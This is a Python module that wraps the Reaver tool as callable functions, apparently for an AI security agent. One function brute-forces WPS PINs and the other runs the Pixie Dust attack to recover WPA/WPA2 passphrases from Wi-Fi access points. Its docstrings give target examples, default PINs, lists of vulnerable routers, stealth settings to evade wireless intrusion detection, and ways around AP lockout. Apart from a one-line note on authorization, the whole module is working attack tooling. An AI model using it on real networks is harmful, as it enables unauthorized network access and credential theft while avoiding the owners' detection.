"""
Reaver - WPS Penetration Testing Tool
======================================

Reaver implements a brute force attack against WiFi Protected Setup (WPS)
PINs to recover WPA/WPA2 passphrases. Exploits poor WPS implementations
and weak random number generation.

PERFORMANCE: WPS attacks are NOT cached as they involve live wireless
operations that must be executed fresh each time.
"""

from skynet.sdk.agents import function_tool
from skynet.tools.common import run_command


@function_tool
def reaver_wps_attack(
    interface: str,
    bssid: str,
    channel: str = "",
    delay: int = 1,
    timeout: int = 5,
    fail_wait: int = 0,
    recurring_delay: int = 0,
    max_attempts: int = 0,
    pin: str = "",
    dh_small: bool = False,
    ignore_locks: bool = False,
    eap_terminate: bool = False,
    nack: bool = False,
    verbose: bool = False,
    ctf=None,
) -> str:
    """
    Brute force WPS PIN to recover WPA/WPA2 passphrase.

    Reaver exploits WPS design flaw that validates PIN in two halves,
    reducing search space from 10^8 to ~11,000 attempts. Success rate
    depends on AP WPS implementation.

    Args:
        interface: Wireless interface in monitor mode
        bssid: Target access point MAC address
        channel: Target WiFi channel (1-14)
        delay: Delay between PIN attempts in seconds
        timeout: Receive timeout for response packets
        fail_wait: Wait time after 10 failed attempts (seconds)
        recurring_delay: Recurring delay period (seconds)
        max_attempts: Maximum PIN attempts (0 = unlimited)
        pin: Test specific WPS PIN (8 digits)
        dh_small: Use small Diffie-Hellman keys (faster)
        ignore_locks: Ignore WPS lock state
        eap_terminate: Terminate association after each M2
        nack: Send NACK instead of ACK after M4
        verbose: Enable verbose output
        ctf: CTF context for execution

    Returns:
        str: WPS PIN and WPA passphrase if successful

    Examples:
        # Standard WPS attack
        reaver_wps_attack(
            interface="wlan0mon",
            bssid="00:11:22:33:44:55",
            channel="6"
        )

        # Aggressive attack (faster but noisier)
        reaver_wps_attack(
            interface="wlan0mon",
            bssid="AA:BB:CC:DD:EE:FF",
            channel="11",
            delay=0,
            dh_small=True
        )

        # Stealth attack (slower but less detectable)
        reaver_wps_attack(
            interface="wlan0mon",
            bssid="11:22:33:44:55:66",
            channel="1",
            delay=5,
            recurring_delay=60
        )

        # Test known PIN
        reaver_wps_attack(
            interface="wlan0mon",
            bssid="77:88:99:AA:BB:CC",
            channel="6",
            pin="12345670"
        )

        # Attack with lockout handling
        reaver_wps_attack(
            interface="wlan0mon",
            bssid="AA:BB:CC:DD:EE:FF",
            channel="6",
            fail_wait=60,
            ignore_locks=True
        )

        # Limited attempts (testing)
        reaver_wps_attack(
            interface="wlan0mon",
            bssid="00:11:22:33:44:55",
            channel="11",
            max_attempts=100,
            verbose=True
        )

    WPS PIN Structure:
        Format: XXXXXXX-C (7 digits + 1 checksum)

        First Half: XXXX (10,000 possibilities)
        Second Half: XXX (1,000 possibilities)
        Checksum: C (calculated from first 7 digits)

        Total: ~11,000 effective PINs to test

    Attack Timeline:
        Speed: 1-10 seconds per PIN
        Completion: 3-30 hours (varies by AP and settings)

        Fast (delay=0): 3-10 hours
        Medium (delay=1): 10-15 hours
        Slow (delay=5): 20-30 hours

    Common Default PINs:
        12345670 - Generic default
        00005678 - Broadcom routers
        12345678 - Some D-Link routers
        01234567 - Various manufacturers
        00000000 - Some routers
        11111111 - Some routers

    Success Output:
        [+] WPS PIN: '12345670'
        [+] WPA PSK: 'password123'
        [+] AP SSID: 'TargetNetwork'

    WPS Lockout Protection:
        Many APs lock WPS after failed attempts:
        - Temporary lockout: 5-60 minutes
        - Rate limiting: Reject rapid requests
        - Permanent lockout: Until reboot

        Mitigation:
        - Use delay between attempts
        - Use fail_wait for long pauses
        - Try ignore_locks option
        - Wait and retry later

    Optimization Options:

    Speed:
        delay=0                 # No delay, maximum speed
        dh_small=True          # Faster DH exchange
        timeout=2              # Quick response timeout

    Stealth:
        delay=5                # 5 seconds between attempts
        recurring_delay=300    # 5-minute periodic pause
        fail_wait=60          # 1-minute wait after failures

    Reliability:
        timeout=10            # Longer timeout for responses
        delay=1               # Standard delay
        eap_terminate=True    # Clean session termination

    Troubleshooting:

    "WARNING: Failed to associate" →
        - Check channel is correct
        - Verify signal strength
        - Try dh_small=True

    "WARNING: Receive timeout occurred" →
        - Increase timeout value
        - Check signal strength
        - AP may be rate limiting

    "WARNING: Detected AP rate limiting" →
        - Increase delay
        - Use fail_wait
        - Wait before retrying

    "WPS transaction failed" →
        - Try different options
        - AP may have locked WPS
        - Check with wash to verify WPS status

    Known Vulnerable Routers:
        - Older Linksys models
        - Some D-Link routers (pre-2014)
        - Early Netgear WNDR series
        - TP-Link TL-WR series (older)
        - Belkin F5D/F7D series

    Modern Protections:
        - WPS disabled by default
        - Rate limiting/lockout
        - Long random PINs
        - WPS button-only mode
        - WPA3 (no WPS support)

    Security Note:
        WPS attacks are loud and disruptive. Generate many packets
        and association attempts. Easily detected by wireless IDS.
        Some APs permanently lock WPS requiring reboot. Use only on
        authorized networks with owner permission.
    """
    cmd_parts = ["reaver"]

    # Target
    cmd_parts.extend(["-i", interface])
    cmd_parts.extend(["-b", bssid])

    if channel:
        cmd_parts.extend(["-c", channel])

    # Timing options
    cmd_parts.extend(["-d", str(delay)])
    cmd_parts.extend(["-T", f".{timeout}"])  # Format: .5 for 5 seconds

    if fail_wait > 0:
        cmd_parts.extend(["-w", str(fail_wait)])

    if recurring_delay > 0:
        cmd_parts.extend(["-r", f"{recurring_delay}:5"])  # delay:channel_hops

    if max_attempts > 0:
        cmd_parts.extend(["-N", str(max_attempts)])

    # PIN specification
    if pin:
        cmd_parts.extend(["-p", pin])

    # Attack options
    if dh_small:
        cmd_parts.append("-S")

    if ignore_locks:
        cmd_parts.append("-L")

    if eap_terminate:
        cmd_parts.append("-E")

    if nack:
        cmd_parts.append("-n")

    # Verbose output
    if verbose:
        cmd_parts.append("-vv")

    # Always use session file
    cmd_parts.extend(["-s", f"reaver_{bssid.replace(':', '')}.session"])

    command = " ".join(cmd_parts)
    return run_command(command, ctf=ctf)


@function_tool
def reaver_pixie_dust(
    interface: str,
    bssid: str,
    channel: str = "",
    delay: int = 0,
    dh_small: bool = True,
    verbose: bool = False,
    ctf=None,
) -> str:
    """
    Pixie Dust WPS attack - exploit weak random number generation.

    Offline attack that exploits poor randomness in some WPS implementations.
    Much faster than brute force (~seconds to minutes vs hours). Try this
    before standard reaver attack.

    Args:
        interface: Wireless interface in monitor mode
        bssid: Target access point MAC address
        channel: Target WiFi channel
        delay: Delay between attempts
        dh_small: Use small DH keys (recommended for Pixie Dust)
        verbose: Enable verbose output
        ctf: CTF context for execution

    Returns:
        str: WPS PIN if Pixie Dust successful

    Examples:
        # Standard Pixie Dust attack
        reaver_pixie_dust(
            interface="wlan0mon",
            bssid="00:11:22:33:44:55",
            channel="6"
        )

        # Verbose Pixie Dust
        reaver_pixie_dust(
            interface="wlan0mon",
            bssid="AA:BB:CC:DD:EE:FF",
            channel="11",
            verbose=True
        )

        # Multiple attempts
        reaver_pixie_dust(
            interface="wlan0mon",
            bssid="11:22:33:44:55:66",
            channel="1",
            delay=1
        )

    How Pixie Dust Works:
        1. Sends WPS exchange packets
        2. Captures PKE, PKR, E-Hash1, E-Hash2
        3. Analyzes randomness quality
        4. If weak RNG detected, calculates PIN offline
        5. Much faster than online brute force

    Success Rate:
        High: Routers with known vulnerable chipsets
        - Ralink/Mediatek RT
        - Broadcom (some)
        - Realtek (some)

        Low: Modern routers with fixed RNG
        - Recent firmware updates
        - High-end enterprise APs

    Timeline:
        Success: Seconds to few minutes
        Failure: Stops quickly if not vulnerable

    vs Standard Reaver:
        Pixie Dust:
            + Very fast (seconds/minutes)
            + Less noisy
            + Works on vulnerable APs only
            - Lower success rate overall

        Standard Reaver:
            + Works on all WPS-enabled APs
            + Higher overall success rate
            - Very slow (hours)
            - Very noisy

    Strategy:
        1. Always try Pixie Dust first
        2. If fails, fall back to standard reaver
        3. If both fail, WPS likely disabled/locked

    Vulnerable Router Brands:
        - Older TP-Link routers
        - Some Technicolor/Thomson
        - Huawei HG series
        - ZTE routers
        - Some D-Link models

    Output:
        Success:
            [+] WPS PIN: '12345670'
            [+] Pixie Dust attack was successful!

        Failure:
            [-] Pixie Dust attack failed
            (Try standard Reaver attack)

    Security Note:
        Pixie Dust is quieter than brute force but still detectable.
        Sends WPS packets and generates authentication attempts.
        Modern routers have patched this vulnerability.
    """
    cmd_parts = ["reaver"]

    # Target
    cmd_parts.extend(["-i", interface])
    cmd_parts.extend(["-b", bssid])

    if channel:
        cmd_parts.extend(["-c", channel])

    # Pixie Dust attack
    cmd_parts.append("-K")  # Pixie Dust mode

    # Timing (fast for Pixie Dust)
    cmd_parts.extend(["-d", str(delay)])
    cmd_parts.extend(["-T", ".5"])  # Short timeout

    # Small DH keys (recommended)
    if dh_small:
        cmd_parts.append("-S")

    # Verbose
    if verbose:
        cmd_parts.append("-vv")

    # Single attempt mode
    cmd_parts.extend(["-N", "1"])

    command = " ".join(cmd_parts)
    return run_command(command, ctf=ctf)
